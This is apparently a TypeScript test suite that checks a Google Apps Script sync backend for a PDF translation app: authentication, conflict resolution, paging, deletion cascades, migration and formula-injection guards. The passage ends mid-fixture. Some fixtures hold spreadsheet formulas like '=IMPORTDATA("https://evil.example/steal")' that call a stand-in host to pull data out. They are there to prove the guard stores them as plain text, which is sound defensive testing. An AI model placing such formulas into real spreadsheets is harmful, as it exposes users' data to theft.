/**
 * The shipped `apps-script/Code.gs`, executed.
 *
 * `sync.test.ts` drives the engine against a hand-written twin of the backend;
 * a twin can agree with the client by accident. This suite evaluates the real
 * file — the exact bytes the "Download Code.gs" button hands a user — inside
 * an in-memory Apps Script runtime (see appsScriptRuntime.ts) and pushes the
 * same JSON bodies `SyncClient` produces. The wire contract, the sheet schema,
 * the last-write-wins rules and the formula-injection guard are therefore
 * proven against the code that actually runs in the user's spreadsheet.
 *
 * What it locks down:
 *   - the deployment handshake: authenticated health + capability ping,
 *   - a byte-exact round trip for every syncable entity — including the text,
 *     glossary and usage columns that used to be buried inside `data`,
 *   - hostile strings (formulas, bullets, phone/date lookalikes) surviving,
 *   - last-write-wins, idempotent retries, tombstones that propagate,
 *   - deleteProject cascading the subtree — orphans included — with a
 *     timestamp that always wins,
 *   - pull paging that neither drops nor duplicates a row,
 *   - budget-driven partial pushes resuming from `nextCursor`,
 *   - the secret-settings guard, validation, and cell-overflow reporting,
 *   - a legacy spreadsheet upgrading in place without losing a value,
 *   - wipe, the pruned token-free SyncLog, and LOCK_TIMEOUT.
 */

import { afterEach, describe, expect, it, vi } from 'vitest'
import {
  createBackend,
  expectCoded,
  expectOk,
  type AppsScriptBackend,
  type Cell,
} from './appsScriptRuntime'

const TOKEN = 'sync-suite-token-42'
const DEVICE = 'dev_server00001'
/** Every fixture is stamped slightly in the past so nothing looks future-dated. */
const NOW = Date.now() - 60_000

/** Must mirror SHEET_DEFS_ order — the sheet inventory the backend promises. */
const SHEETS = [
  'Projects',
  'Pages',
  'Blocks',
  'Glossary',
  'Settings',
  'UsageStats',
  'ApiKeys',
  'SyncLog',
]

interface WireRecord {
  entity: string
  id: string
  op: string
  updatedAt: number
  version: number
  deviceId: string
  record: Record<string, unknown>
}

function fresh(properties: Record<string, string> = { TOKEN }): AppsScriptBackend {
  return createBackend({ properties })
}

function call(
  backend: AppsScriptBackend,
  action: string,
  payload: Record<string, unknown> = {},
  token: string | null = TOKEN,
): Record<string, unknown> {
  const body: Record<string, unknown> = { action, deviceId: DEVICE, ...payload }
  if (token !== null) body.token = token
  return backend.post(body)
}

function change(
  entity: string,
  record: Record<string, unknown>,
  op: 'upsert' | 'delete' = 'upsert',
): Record<string, unknown> {
  return {
    entity,
    id: String(record.id),
    op,
    record,
    updatedAt: Number(record.updatedAt),
    version: Number(record.version),
    deviceId: String(record.deviceId),
  }
}

function num(value: unknown, label: string): number {
  if (typeof value !== 'number' || !Number.isFinite(value)) {
    throw new Error(`${label}: expected a number, got ${String(value)}`)
  }
  return value
}

function list(value: unknown, label: string): Record<string, unknown>[] {
  if (!Array.isArray(value)) throw new Error(`${label}: expected an array`)
  return value as Record<string, unknown>[]
}

function record(
  id: string,
  updatedAt: number,
  extra: Record<string, unknown> = {},
): Record<string, unknown> {
  return {
    id,
    createdAt: NOW,
    updatedAt,
    deviceId: DEVICE,
    version: 1,
    ...extra,
  }
}

function project(id: string, updatedAt: number, extra: Record<string, unknown> = {}) {
  return record(id, updatedAt, {
    name: 'React — လေ့လာရေး',
    sourceFileName: 'book.pdf',
    sourceFileSize: 8_400_000,
    sourceLang: 'en',
    targetLang: 'my',
    status: 'review',
    pageCount: 350,
    translatedPageCount: 12,
    blockCount: 40,
    characterCount: 9_000,
    progress: 3,
    archived: false,
    archivedAt: null,
    lastOpenedAt: NOW,
    notes: 'line one\n- a bullet the sheet must not eat',
    ...extra,
  })
}

function page(
  id: string,
  projectId: string,
  updatedAt: number,
  extra: Record<string, unknown> = {},
) {
  return record(id, updatedAt, {
    projectId,
    index: 0,
    width: 612,
    height: 792,
    rotation: 0,
    hasTextLayer: true,
    textCharacterCount: 1200,
    ocrStatus: 'done',
    renderStatus: 'rendered',
    blockCount: 2,
    contentClass: 'text',
    textCoverage: 0.97,
    detectedLanguage: 'en',
    lineCount: 18,
    analysisState: 'done',
    ocrConfidence: null,
    ...extra,
  })
}

const LINES = [
  {
    id: 'ln_1',
    text: 'React is a JavaScript library',
    bbox: { x: 40, y: 120, w: 300, h: 14 },
    style: { fontSize: 11, bold: false, italic: false, color: '#111111' },
  },
]

function block(
  id: string,
  projectId: string,
  pageId: string,
  updatedAt: number,
  extra: Record<string, unknown> = {},
) {
  return record(id, updatedAt, {
    projectId,
    pageId,
    order: 0,
    kind: 'paragraph',
    sourceText: 'React is a JavaScript library for building user interfaces.',
    translatedText: 'React သည် UI များ တည်ဆောက်ရန် JavaScript စာကြည့်တိုက်ဖြစ်သည်။',
    x: 40,
    y: 120,
    width: 500,
    height: 90,
    fontFamily: 'Noto Sans',
    originalFontFamily: 'Times',
    fontSize: 11,
    originalFontSize: 11,
    lineHeight: 1.4,
    color: '#111111',
    bold: false,
    italic: false,
    status: 'translated',
    characterCount: 42,
    region: 'body',
    alignment: 'left',
    lines: LINES,
    skipRule: null,
    placeholders: [],
    listMarker: null,
    headingLevel: 0,
    links: [],
    tableCells: null,
    tableSpans: null,
    figures: [],
    translationConfidence: 0.91,
    translationFlag: null,
    translatedAt: NOW,
    suggestedText: null,
    suggestedModel: null,
    suggestedAt: null,
    fontSizeMode: 'auto',
    overflow: false,
    ...extra,
  })
}

function glossary(id: string, updatedAt: number, extra: Record<string, unknown> = {}) {
  return record(id, updatedAt, {
    projectId: null,
    sourceTerm: 'component',
    targetTerm: 'အစိတ်အပိုင်း',
    sourceLang: 'en',
    targetLang: 'my',
    notes: '- keep the term untranslated in code samples',
    caseSensitive: false,
    ...extra,
  })
}

function setting(id: string, updatedAt: number, extra: Record<string, unknown> = {}) {
  return record(id, updatedAt, { group: id.split('.')[0], value: 'dark', ...extra })
}

function usage(id: string, updatedAt: number, extra: Record<string, unknown> = {}) {
  return record(id, updatedAt, {
    provider: 'groq',
    model: 'gpt-oss-120b',
    day: '2026-10-11',
    requests: 12,
    failedRequests: 1,
    characters: 900,
    tokensIn: 4000,
    tokensOut: 900,
    costUsd: 0,
    ...extra,
  })
}

function apiKey(id: string, updatedAt: number, extra: Record<string, unknown> = {}) {
  return record(id, updatedAt, {
    provider: 'gemini',
    label: 'Main key',
    lastFour: 'ce12',
    secret: 'AIzaSyFakeSecretValueForTests0000',
    enabled: true,
    models: ['gemini-2.0-flash'],
    ...extra,
  })
}

/** Walks `pullChanges` to the end, exactly as the engine's pullPhase does. */
function pullAll(backend: AppsScriptBackend, limit?: number): WireRecord[] {
  const out: WireRecord[] = []
  let since = 0
  for (let guard = 0; guard < 60; guard += 1) {
    const body: Record<string, unknown> = { since }
    if (limit !== undefined) body.limit = limit
    const res = expectOk(call(backend, 'pullChanges', body), 'pullChanges')
    out.push(...(list(res.changes, 'changes') as unknown as WireRecord[]))
    if (res.hasMore !== true) return out
    since = num(res.nextCursor, 'nextCursor')
  }
  throw new Error('pullChanges never drained')
}

function pulledRecords(backend: AppsScriptBackend): Map<string, WireRecord> {
  return new Map(pullAll(backend).map((entry) => [entry.id, entry]))
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe('apps-script/Code.gs — the shipped backend', () => {
  describe('deployment handshake', () => {
    it('answers health only with the token, and provisions the tabs with it', () => {
      const backend = fresh()

      expectCoded(backend.health(), 'UNAUTHORIZED', 'anonymous health probe')
      // An unauthenticated probe must not touch the spreadsheet at all.
      expect(backend.spreadsheet().names()).toEqual([])

      const health = expectOk(backend.health(TOKEN), 'health')
      expect(health.sheetNames).toEqual(SHEETS)
      expect(health.entities).toEqual([
        'projects',
        'pages',
        'blocks',
        'glossary',
        'settings',
        'usageStats',
        'apiKeys',
      ])
      expect(backend.spreadsheet().names()).toEqual(SHEETS)
    })

    it('ping advertises the storable entities and rejects a bad token', () => {
      const backend = fresh()
      const pong = expectOk(call(backend, 'ping'), 'ping')
      expect(pong.pong).toBe(true)
      expect(pong.entities).toEqual([
        'projects',
        'pages',
        'blocks',
        'glossary',
        'settings',
        'usageStats',
        'apiKeys',
      ])
      expect(pong.sheetNames).toEqual(SHEETS)
      // Nothing was written: ping only proves the deployment works.
      expect(backend.sheet('Projects')!.dataRowCount()).toBe(0)

      expectCoded(call(backend, 'ping', {}, 'wrong-token'), 'UNAUTHORIZED', 'ping')
      expectCoded(call(backend, 'ping', {}, null), 'UNAUTHORIZED', 'ping without a token')
    })

    it('refuses to start without a configured token', () => {
      const backend = createBackend({ properties: {} })
      expectCoded(
        call(backend, 'ping', {}, 'anything'),
        'UNAUTHORIZED',
        'deployment with no TOKEN property',
      )
    })
  })

  describe('schema round trip', () => {
    it('stores every syncable entity and gives the readable fields their own column', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')

      const tableBlock = block('blk_1', 'prj_1', 'pg_1', NOW + 2, {
        kind: 'table',
        sourceText: '=IMPORTDATA("https://evil.example/x")',
        translatedText: '- မြန်မာစာ လိုင်း',
        tableCells: [
          ['A', 'B'],
          ['C', 'D'],
        ],
        status: 'edited',
      })
      const changes = [
        change('projects', project('prj_1', NOW)),
        change('pages', page('pg_1', 'prj_1', NOW + 1)),
        change('blocks', tableBlock),
        change('glossary', glossary('gl_1', NOW + 3)),
        change('settings', setting('ui.theme', NOW + 4)),
        change('usageStats', usage('us_1', NOW + 5)),
        change('apiKeys', apiKey('key_1', NOW + 6)),
      ]
      const pushed = expectOk(call(backend, 'pushChanges', { changes }), 'push all entities')
      expect(num(pushed.applied, 'applied')).toBe(7)
      expect(num(pushed.deferred, 'deferred')).toBe(0)

      // The spreadsheet is a database a person can open, not a JSON dump: the
      // fields worth reading or filtering live in their own cells.
      const blockRow = backend.sheet('Blocks')!.rowById('blk_1')!
      expect(blockRow.kind).toBe('table')
      expect(blockRow.sourceText).toBe('=IMPORTDATA("https://evil.example/x")')
      expect(blockRow.translatedText).toBe('- မြန်မာစာ လိုင်း')
      expect(blockRow.status).toBe('edited')
      expect(blockRow.order).toBe(0)
      expect(String(blockRow.data)).toContain('"lines"')

      const termRow = backend.sheet('Glossary')!.rowById('gl_1')!
      expect(termRow.sourceTerm).toBe('component')
      expect(termRow.targetTerm).toBe('အစိတ်အပိုင်း')
      expect(termRow.sourceLang).toBe('en')
      expect(termRow.targetLang).toBe('my')
      expect(termRow.caseSensitive).toBe(false)

      const usageRow = backend.sheet('UsageStats')!.rowById('us_1')!
      expect(usageRow.provider).toBe('groq')
      expect(usageRow.model).toBe('gpt-oss-120b')
      expect(usageRow.day).toBe('2026-10-11') // a date-looking string, still a string
      expect(usageRow.requests).toBe(12)
      expect(usageRow.costUsd).toBe(0)

      const settingRow = backend.sheet('Settings')!.rowById('ui.theme')!
      expect(settingRow.value).toBe('dark')
      expect(settingRow.group).toBe('ui')

      // Every write went to a Plain Text range: nothing was re-parsed into a
      // formula or silently coerced on the way in.
      expect(backend.stats.formulaWrites).toBe(0)
      expect(backend.stats.coercedWrites).toBe(0)

      // …and every field comes back out of the sheet unchanged.
      const pulled = pulledRecords(backend)
      expect(pulled.size).toBe(7)
      const projectRec = pulled.get('prj_1')!.record
      expect(projectRec.name).toBe('React — လေ့လာရေး')
      expect(projectRec.pageCount).toBe(350)
      expect(projectRec.notes).toContain('- a bullet')
      expect(projectRec.archived).toBe(false)
      expect(projectRec.archivedAt).toBeNull()

      const blockRec = pulled.get('blk_1')!.record
      expect(blockRec.kind).toBe('table')
      expect(blockRec.sourceText).toBe('=IMPORTDATA("https://evil.example/x")')
      expect(blockRec.translatedText).toBe('- မြန်မာစာ လိုင်း')
      expect(blockRec.lines).toEqual(LINES)
      expect(blockRec.tableCells).toEqual([
        ['A', 'B'],
        ['C', 'D'],
      ])
      expect(blockRec.status).toBe('edited')

      const termRec = pulled.get('gl_1')!.record
      expect(termRec.sourceTerm).toBe('component')
      expect(termRec.notes).toContain('untranslated')
      expect(termRec.caseSensitive).toBe(false)
      expect(termRec.projectId).toBeNull() // a global entry stays global

      const keyRec = pulled.get('key_1')!.record
      expect(keyRec.secret).toBe('AIzaSyFakeSecretValueForTests0000')
      expect(keyRec.enabled).toBe(true)
      expect(keyRec.models).toEqual(['gemini-2.0-flash'])
    })

    it('survives formulas, bullets and phone/date lookalikes', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')

      const hostileTerm = glossary('gl_hostile', NOW, {
        sourceTerm: '-5',
        targetTerm: '=IMPORTDATA("https://evil.example/steal")',
        notes: '01/02/2026',
      })
      const phone = block('blk_phone', 'prj_1', 'pg_1', NOW + 1, {
        sourceText: '+1-555-0100',
        translatedText: '@SUM(A1:A9)',
      })
      expectOk(
        call(backend, 'pushChanges', {
          changes: [change('glossary', hostileTerm), change('blocks', phone)],
        }),
        'hostile push',
      )

      const pulled = pulledRecords(backend)
      expect(pulled.get('gl_hostile')!.record.sourceTerm).toBe('-5')
      expect(pulled.get('gl_hostile')!.record.targetTerm).toBe(
        '=IMPORTDATA("https://evil.example/steal")',
      )
      expect(pulled.get('gl_hostile')!.record.notes).toBe('01/02/2026')
      expect(pulled.get('blk_phone')!.record.sourceText).toBe('+1-555-0100')
      expect(pulled.get('blk_phone')!.record.translatedText).toBe('@SUM(A1:A9)')
      expect(backend.stats.formulaWrites).toBe(0)
      expect(backend.stats.coercedWrites).toBe(0)
    })
  })

  describe('conflict resolution', () => {
    it('applies last-write-wins and treats a retried push as a no-op', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('blocks', block('blk_lww', 'prj_1', 'pg_1', NOW, { sourceText: 'first' })),
          ],
        }),
        'v1',
      )

      const stale = expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change(
              'blocks',
              block('blk_lww', 'prj_1', 'pg_1', NOW - 5_000, { sourceText: 'stale' }),
            ),
          ],
        }),
        'stale push',
      )
      expect(num(stale.applied, 'applied')).toBe(0)
      expect(num(stale.skipped, 'skipped')).toBe(1)

      const newer = block('blk_lww', 'prj_1', 'pg_1', NOW + 5_000, { sourceText: 'second' })
      expectOk(call(backend, 'pushChanges', { changes: [change('blocks', newer)] }), 'newer')
      expect(pulledRecords(backend).get('blk_lww')!.record.sourceText).toBe('second')

      // Equal timestamp → the higher version wins.
      const versioned = { ...newer, sourceText: 'third', version: 2 }
      expectOk(call(backend, 'pushChanges', { changes: [change('blocks', versioned)] }), 'version')
      expect(pulledRecords(backend).get('blk_lww')!.record.sourceText).toBe('third')

      // Equal timestamp and version → the greater device id wins.
      const otherDevice = { ...versioned, sourceText: 'fourth', deviceId: 'dev_zzz' }
      const won = expectOk(
        call(backend, 'pushChanges', { changes: [change('blocks', otherDevice)] }),
        'device tie-break',
      )
      expect(num(won.applied, 'applied')).toBe(1)
      expect(pulledRecords(backend).get('blk_lww')!.deviceId).toBe('dev_zzz')

      // Re-pushing what already won — the client's retry — changes nothing.
      const retry = expectOk(
        call(backend, 'pushChanges', { changes: [change('blocks', otherDevice)] }),
        'retry',
      )
      expect(num(retry.applied, 'applied')).toBe(0)
      expect(num(retry.skipped, 'skipped')).toBe(1)
      expect(pulledRecords(backend).get('blk_lww')!.record.sourceText).toBe('fourth')
    })

    it('propagates a tombstone through pullChanges', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectOk(
        call(backend, 'pushChanges', {
          changes: [change('blocks', block('blk_del', 'prj_1', 'pg_1', NOW))],
        }),
        'seed',
      )
      const doomed = block('blk_del', 'prj_1', 'pg_1', NOW + 10_000)
      expectOk(
        call(backend, 'pushChanges', { changes: [change('blocks', doomed, 'delete')] }),
        'tombstone',
      )
      expect(backend.sheet('Blocks')!.rowById('blk_del')!.deleted).toBe(true)

      const pulled = pulledRecords(backend).get('blk_del')!
      expect(pulled.op).toBe('delete')
      expect(pulled.record.deleted).toBe(true)
    })
  })

  describe('deleteProject', () => {
    it('cascades the whole subtree and beats a future-stamped row', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      // A device whose clock runs ahead wrote this block, so its timestamp is
      // beyond anything this machine can stamp "now" with.
      const future = Date.now() + 600_000
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('projects', project('prj_1', NOW)),
            change('pages', page('pg_1', 'prj_1', NOW + 1)),
            change(
              'blocks',
              block('blk_1', 'prj_1', 'pg_1', future, { deviceId: 'dev_clockahead' }),
            ),
          ],
        }),
        'seed',
      )

      const res = expectOk(call(backend, 'deleteProject', { projectId: 'prj_1' }), 'deleteProject')
      expect(num(res.project, 'project')).toBe(1)
      expect(num(res.pages, 'pages')).toBe(1)
      expect(num(res.blocks, 'blocks')).toBe(1)

      const row = backend.sheet('Blocks')!.rowById('blk_1')!
      expect(row.deleted).toBe(true)
      expect(num(row.updatedAt, 'tombstone updatedAt')).toBeGreaterThan(future)

      const pulled = pulledRecords(backend)
      expect([...pulled.values()].filter((entry) => entry.op === 'delete')).toHaveLength(3)
    })

    it('kills orphans left behind by a half-finished push', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      // Only the blocks ever reached the spreadsheet: the project's own push
      // failed earlier, so there is no project row to delete.
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('blocks', block('blk_orphan', 'prj_lost', 'pg_lost', NOW)),
            change('blocks', block('blk_orphan2', 'prj_lost', 'pg_lost', NOW + 1)),
          ],
        }),
        'orphan seed',
      )

      const res = expectOk(
        call(backend, 'deleteProject', { projectId: 'prj_lost' }),
        'orphan cascade',
      )
      expect(num(res.project, 'project')).toBe(0)
      expect(num(res.blocks, 'blocks')).toBe(2)
      expect(backend.sheet('Blocks')!.rowById('blk_orphan')!.deleted).toBe(true)
      const pulled = pulledRecords(backend)
      expect(pulled.size).toBe(2)
      expect([...pulled.values()].every((entry) => entry.op === 'delete')).toBe(true)
    })

    it('reports NOT_FOUND only when nothing matched', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectCoded(
        call(backend, 'deleteProject', { projectId: 'prj_missing' }),
        'NOT_FOUND',
        'unknown project',
      )

      // A project that is already a tombstone still counts as found — the
      // deletion succeeded, twice.
      expectOk(
        call(backend, 'pushChanges', { changes: [change('projects', project('prj_gone', NOW))] }),
        'seed',
      )
      expectOk(
        call(backend, 'pushChanges', {
          changes: [change('projects', project('prj_gone', NOW + 1), 'delete')],
        }),
        'tombstone',
      )
      const again = expectOk(
        call(backend, 'deleteProject', { projectId: 'prj_gone' }),
        'repeated delete',
      )
      expect(num(again.project, 'project')).toBe(1)
    })
  })

  describe('pull paging', () => {
    it('pages forward without dropping or duplicating a row, ties included', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      const changes: Record<string, unknown>[] = []
      // Six pages sharing three timestamps — a bulk parse stamps a page range
      // in the same millisecond — and nine blocks with their own.
      for (let i = 0; i < 6; i += 1) {
        changes.push(change('pages', page(`pg_${i}`, 'prj_1', NOW + (i % 3) * 10)))
      }
      for (let i = 0; i < 9; i += 1) {
        changes.push(change('blocks', block(`blk_${i}`, 'prj_1', 'pg_0', NOW + 100 + i)))
      }
      expectOk(call(backend, 'pushChanges', { changes }), 'seed 15 rows')

      // limit 4 forces the tied timestamps across a page boundary.
      const pulled = pullAll(backend, 4)
      expect(pulled).toHaveLength(15)
      expect(new Set(pulled.map((entry) => entry.id)).size).toBe(15)
    })
  })

  describe('push budget', () => {
    it('stops when the execution budget expires and resumes from nextCursor', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      const changes = [
        change('projects', project('prj_1', NOW)),
        change('projects', project('prj_2', NOW + 1)),
        change('pages', page('pg_1', 'prj_1', NOW + 2)),
        change('pages', page('pg_2', 'prj_1', NOW + 3)),
        change('blocks', block('blk_1', 'prj_1', 'pg_1', NOW + 4)),
        change('blocks', block('blk_2', 'prj_1', 'pg_1', NOW + 5)),
      ]

      // Expire the shared budget right after the first sheet is written.
      const realNow = Date.now
      let jumped = false
      vi.spyOn(Date, 'now').mockImplementation(() => realNow() + (jumped ? 400_000 : 0))
      backend.hooks.onSheetWrite = (sheet) => {
        if (sheet === 'Projects') jumped = true
      }
      let partial: Record<string, unknown>
      try {
        partial = expectOk(call(backend, 'pushChanges', { changes }), 'budget push')
      } finally {
        backend.hooks.onSheetWrite = undefined
        vi.restoreAllMocks()
      }

      expect(partial.partial).toBe(true)
      expect(num(partial.applied, 'applied')).toBe(2)
      expect(num(partial.nextCursor, 'nextCursor')).toBe(2)
      expect(backend.sheet('Pages')!.dataRowCount()).toBe(0)

      const resume = expectOk(call(backend, 'pushChanges', { changes: changes.slice(2) }), 'resume')
      expect(resume.partial).toBe(false)
      expect(num(resume.applied, 'applied')).toBe(4)
      expect(backend.sheet('Pages')!.dataRowCount()).toBe(2)
      expect(backend.sheet('Blocks')!.dataRowCount()).toBe(2)

      const retry = expectOk(call(backend, 'pushChanges', { changes }), 're-push everything')
      expect(num(retry.applied, 'applied')).toBe(0)
      expect(num(retry.skipped, 'skipped')).toBe(6)
    })
  })

  describe('guards', () => {
    it('rejects a batch that hides a credential before writing anything', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      const res = call(backend, 'pushChanges', {
        changes: [
          change('projects', project('prj_1', NOW)),
          change('settings', setting('sync.appsScriptToken', NOW, { value: 'leaked' })),
        ],
      })
      expectCoded(res, 'SECRET_NOT_ALLOWED', 'credential pushed into Settings')
      expect(backend.sheet('Projects')!.dataRowCount()).toBe(0)
      expect(backend.sheet('Settings')!.dataRowCount()).toBe(0)
    })

    it('validates the request shape', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      const shaped = (extra: Record<string, unknown>) => ({
        entity: 'blocks',
        id: 'blk_x',
        op: 'upsert',
        record: {},
        updatedAt: NOW,
        version: 1,
        deviceId: DEVICE,
        ...extra,
      })

      expectCoded(
        call(backend, 'pushChanges', { changes: {} }),
        'BAD_REQUEST',
        'changes is not an array',
      )
      expectCoded(
        call(backend, 'pushChanges', { changes: [shaped({ entity: 'translations' })] }),
        'BAD_REQUEST',
        'unknown entity',
      )
      expectCoded(
        call(backend, 'pushChanges', { changes: [shaped({ op: 'merge' })] }),
        'BAD_REQUEST',
        'unknown op',
      )
      expectCoded(
        call(backend, 'pushChanges', { changes: [shaped({ updatedAt: 'nope' })] }),
        'BAD_REQUEST',
        'non-numeric updatedAt',
      )
      expectCoded(call(backend, 'pullChanges', { limit: 0 }), 'BAD_REQUEST', 'limit below 1')
      expectCoded(call(backend, 'wipe', {}), 'BAD_REQUEST', 'wipe without confirmation')
      expectCoded(call(backend, 'deleteProject', {}), 'BAD_REQUEST', 'no projectId')
      expectCoded(call(backend, 'nonesuch', {}), 'UNKNOWN_ACTION', 'unknown action')
    })

    it('reports cell overflow instead of losing a record silently', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')

      const long = block('blk_long', 'prj_1', 'pg_1', NOW, { sourceText: 'A'.repeat(60_000) })
      const longRes = expectOk(
        call(backend, 'pushChanges', { changes: [change('blocks', long)] }),
        'oversized text',
      )
      expect(num(longRes.truncated, 'truncated')).toBeGreaterThanOrEqual(1)
      expect(String(backend.sheet('Blocks')!.rowById('blk_long')!.sourceText).length).toBe(45_000)

      // A structured payload that outgrows the cell gives up `lines` — the
      // content still travels, and what is left is still valid JSON.
      const fat = block('blk_fat', 'prj_1', 'pg_1', NOW + 1, {
        lines: Array.from({ length: 400 }, (_, i) => ({
          id: `ln_${i}`,
          text: `${i} `.repeat(120),
          bbox: { x: 1, y: i, w: 300, h: 14 },
          style: { fontSize: 11, bold: false, italic: false, color: '#111111' },
        })),
      })
      const fatRes = expectOk(
        call(backend, 'pushChanges', { changes: [change('blocks', fat)] }),
        'oversized lines',
      )
      expect(num(fatRes.truncated, 'truncated')).toBeGreaterThanOrEqual(1)
      const fatRow = backend.sheet('Blocks')!.rowById('blk_fat')!
      expect(String(fatRow.data)).not.toContain('"lines"')
      expect(() => JSON.parse(String(fatRow.data))).not.toThrow()

      const fatRec = pulledRecords(backend).get('blk_fat')!.record
      expect(fatRec.lines).toBeUndefined()
      expect(fatRec.sourceText).toBe(fat.sourceText)
      expect(fatRec.translatedText).toBe(fat.translatedText)
    })
  })

  describe('schema migration', () => {
    it('upgrades a legacy spreadsheet in place and keeps every old value readable', () => {
      const backend = fresh()
      const ss = backend.spreadsheet()
      // The layout that shipped before this review: `type` instead of `kind`,
      // the text fields buried inside `data`, and glossary terms in columns
      // that never matched a client field (so they were always empty).
      const legacyBlocks = ss.insertSheet('Blocks')
      legacyBlocks
        .getRange(1, 1, 1, 10)
        .setValues([
          [
            'id',
            'updatedAt',
            'deviceId',
            'version',
            'deleted',
            'projectId',
            'pageId',
            'order',
            'type',
            'data',
          ],
        ])
      legacyBlocks.getRange(2, 1, 1, 10).setValues([
        [
          'blk_old',
          NOW,
          'dev_old',
          2,
          false,
          'prj_1',
          'pg_1',
          4,
          '',
          JSON.stringify({
            kind: 'paragraph',
            sourceText: 'legacy text',
            translatedText: 'မူရင်းစာ',
            status: 'translated',
            lines: LINES,
          }),
        ],
      ])
      const legacyGlossary = ss.insertSheet('Glossary')
      legacyGlossary
        .getRange(1, 1, 1, 10)
        .setValues([
          [
            'id',
            'updatedAt',
            'deviceId',
            'version',
            'deleted',
            'source',
            'target',
            'note',
            'locale',
            'data',
          ],
        ])
      legacyGlossary.getRange(2, 1, 1, 10).setValues([
        [
          'gl_old',
          NOW,
          'dev_old',
          1,
          false,
          '',
          '',
          '',
          '',
          JSON.stringify({
            projectId: null,
            sourceTerm: 'state',
            targetTerm: 'အခြေအနေ',
            sourceLang: 'en',
            targetLang: 'my',
            notes: '',
            caseSensitive: true,
          }),
        ],
      ])

      expectOk(call(backend, 'ping'), 'ping migrates the sheets')
      expect(backend.sheet('Blocks')!.header()).toHaveLength(13)
      expect(backend.sheet('Glossary')!.header()).toHaveLength(12)

      // No cell was moved or lost: the old values now read through the `data`
      // fallback, exactly as a row written before the columns existed must.
      const pulled = pulledRecords(backend)
      const oldBlock = pulled.get('blk_old')!.record
      expect(oldBlock.kind).toBe('paragraph')
      expect(oldBlock.sourceText).toBe('legacy text')
      expect(oldBlock.translatedText).toBe('မူရင်းစာ')
      expect(oldBlock.status).toBe('translated')
      expect(oldBlock.lines).toEqual(LINES)
      expect(oldBlock.order).toBe(4)
      const oldTerm = pulled.get('gl_old')!.record
      expect(oldTerm.sourceTerm).toBe('state')
      expect(oldTerm.targetTerm).toBe('အခြေအနေ')
      expect(oldTerm.caseSensitive).toBe(true)
      expect(oldTerm.projectId).toBeNull()

      // A new record writes into the columns; the legacy row stays as it was.
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('blocks', block('blk_new', 'prj_1', 'pg_1', NOW + 5, { kind: 'heading' })),
          ],
        }),
        'new block',
      )
      const newRow = backend.sheet('Blocks')!.rowById('blk_new')!
      expect(newRow.kind).toBe('heading')
      expect(String(newRow.sourceText)).toBe(
        block('blk_new', 'prj_1', 'pg_1', NOW + 5).sourceText as string,
      )
      expect(String(newRow.data)).not.toContain('"sourceText"')
      expect(backend.sheet('Blocks')!.rowById('blk_old')!.projectId).toBe('prj_1')
      expect(backend.stats.formulaWrites).toBe(0)
    })

    it('refuses to guess at a hand-edited header row', () => {
      const backend = fresh()
      const sheet = backend.spreadsheet().insertSheet('Blocks')
      sheet
        .getRange(1, 1, 1, 10)
        .setValues([
          [
            'id',
            'updatedAt',
            'deviceId',
            'version',
            'deleted',
            'projectId',
            'pageId',
            'order',
            'whatever',
            'data',
          ],
        ])
      expectCoded(call(backend, 'ping'), 'INTERNAL', 'hand-edited header row')
    })
  })

  describe('administration', () => {
    it('wipes every syncable sheet, keys included, and keeps the audit trail', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('projects', project('prj_1', NOW)),
            change('pages', page('pg_1', 'prj_1', NOW + 1)),
            change('blocks', block('blk_1', 'prj_1', 'pg_1', NOW + 2)),
            change('glossary', glossary('gl_1', NOW + 3)),
            change('settings', setting('ui.theme', NOW + 4)),
            change('usageStats', usage('us_1', NOW + 5)),
            change('apiKeys', apiKey('key_1', NOW + 6)),
          ],
        }),
        'seed',
      )

      const res = expectOk(call(backend, 'wipe', { confirm: 'WIPE' }), 'wipe')
      const cleared = res.cleared as Record<string, number>
      expect(cleared.ApiKeys).toBe(1) // keys are the most sensitive row here
      expect(cleared.Blocks).toBe(1)
      expect(num(res.total, 'total')).toBe(7)
      for (const name of [
        'Projects',
        'Pages',
        'Blocks',
        'Glossary',
        'Settings',
        'UsageStats',
        'ApiKeys',
      ]) {
        expect(backend.sheet(name)!.dataRowCount(), `${name} after wipe`).toBe(0)
      }
      expect(backend.sheet('SyncLog')!.dataRowCount()).toBeGreaterThan(0)
      expect(pullAll(backend)).toHaveLength(0)
    })

    it('logs every action, trims the log, and never records the token', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectOk(
        call(backend, 'pushChanges', { changes: [change('projects', project('prj_1', NOW))] }),
        'push',
      )
      expectOk(call(backend, 'pullChanges', {}), 'pull')
      expectCoded(call(backend, 'pushChanges', { changes: 'nope' }), 'BAD_REQUEST', 'bad push')

      const log = backend.sheet('SyncLog')!
      const rows = log.grid().slice(1)
      expect(rows).toHaveLength(4) // ping + push + pull + the rejected push
      expect(rows.some((row) => row[5] === 'ERROR')).toBe(true)
      expect(rows.some((row) => String(row[6]).startsWith('BAD_REQUEST'))).toBe(true)
      expect(
        log
          .grid()
          .flat()
          .some((cell) => String(cell).includes(TOKEN)),
      ).toBe(false)

      // A log that outgrows its ceiling is trimmed rather than left to eat the
      // spreadsheet's cell allowance.
      const header = log.grid()[0]
      const seeded = [
        header,
        ...Array.from({ length: 15_001 }, (_, i): Cell[] => [
          NOW - i,
          'dev_old',
          'ping',
          0,
          false,
          'OK',
          `row ${i}`,
